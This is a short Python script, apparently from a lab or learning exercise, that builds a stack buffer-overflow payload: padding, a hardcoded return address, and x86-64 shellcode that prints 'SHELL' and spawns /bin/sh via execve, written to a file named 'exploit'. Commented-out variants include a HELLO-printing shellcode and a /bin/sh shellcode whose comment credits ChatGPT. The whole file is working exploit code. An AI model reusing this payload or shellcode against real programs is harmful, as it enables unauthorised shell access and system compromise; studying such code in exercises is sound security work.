import struct
payload = b"A"*(4+8) + struct.pack("<Q", 0x7fffffffddb0) #local var+rsp+ret address
#shellcode = b"\x48\xB8\x48\x45\x4C\x4C\x4F\x09\x00\x00\x48\xBB\x00\x00\x00\x00\x00\x01\x00\x00\x48\x01\xD8\x50\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\x06\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x0F\x05" #print HELLO

#shellcode = b"\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05" #ask chatGPT for a quick /bin/sh 

shellcode = b"\x48\xB8\x53\x48\x45\x4C\x4C\x00\x00\x00\x48\xBB\x00\x00\x00\x00\x00\x01\x00\x00\x48\x01\xD8\x50\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\x06\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\x31\xd2\x52\x48\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05" #print SHELL+/bin/sh




# Pack the shellcode into little-endian format
payload += struct.pack("<{}s".format(len(shellcode)), shellcode)
print(payload)
with open("exploit", "wb") as f:
    f.write(payload)

print("Exploit file 'exploit' created.")
